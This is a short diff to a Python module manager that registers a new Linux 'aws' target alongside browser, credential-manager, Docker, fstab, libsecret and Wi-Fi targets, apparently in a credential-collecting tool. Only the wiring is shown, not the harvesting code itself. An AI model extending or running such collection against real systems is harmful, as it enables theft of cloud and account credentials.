@@ -13,6 +13,7 @@ if sys.platform.startswith('win32'):
 	from modules.windows.wifi import Wifi
 
 if sys.platform.startswith('linux'):
+	from modules.linux.aws import Aws
 	from modules.linux.docker import Docker
 	from modules.linux.fstab import Fstab
 	from modules.linux.libsecret import Libsecret
@@ -79,6 +80,7 @@ class ModuleManager:
 		self.targets = {
 			'chromium': [],
 			'firefox': [],
+			'aws': False,
 			'credman': False,
 			'docker': False,
 			'fstab': False,
@@ -120,6 +122,9 @@ class ModuleManager:
 				self.targets['wifi'] = True
 
 			if sys.platform.startswith('linux'):
+				self.targets['aws'] = True
+
+			if sys.platform.startswith('linux'):
 				self.targets['docker'] = True
 
 			if sys.platform.startswith('linux'):
@@ -142,6 +147,9 @@ class ModuleManager:
 			if 'wifi' in modules and sys.platform.startswith('win32'):
 				self.targets['wifi'] = True
 
+			if 'aws' in modules and sys.platform.startswith('linux'):
+				self.targets['aws'] = True
+
 			if 'docker' in modules and sys.platform.startswith('linux'):
 				self.targets['docker'] = True
 
@@ -156,6 +164,7 @@ class ModuleManager:
 		self.targets = {
 			'chromium': [],
 			'firefox': [],
+			'aws': False,
 			'credman': False,
 			'docker': False,
 			'fstab': False,
@@ -177,6 +186,8 @@ class ModuleManager:
 							[Chromium(browser_name=name, paths=paths) for name, paths in self.targets.get(key)])
 					case 'firefox':
 						drivers.extend([Mozilla(browser_name=name, path=path) for name, path in self.targets.get(key)])
+					case 'aws':
+						drivers.extend([Aws()])
 					case 'credman':
 						drivers.extend([Credman()])
 					case 'docker':
